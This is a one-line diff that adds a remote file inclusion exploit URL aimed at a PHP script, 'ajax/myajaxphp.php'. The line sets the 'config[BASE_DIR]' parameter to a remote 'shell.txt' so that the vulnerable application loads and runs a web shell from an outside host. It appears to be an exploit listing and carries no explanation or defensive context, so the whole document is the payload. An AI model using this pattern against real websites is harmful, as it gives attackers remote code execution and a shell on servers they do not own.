@@ -1,0 +1,1 @@
+http://www.example.com/[Script Path]/ajax/myajaxphp.php?config[BASE_DIR]=http://www.example.com/shell.txt?
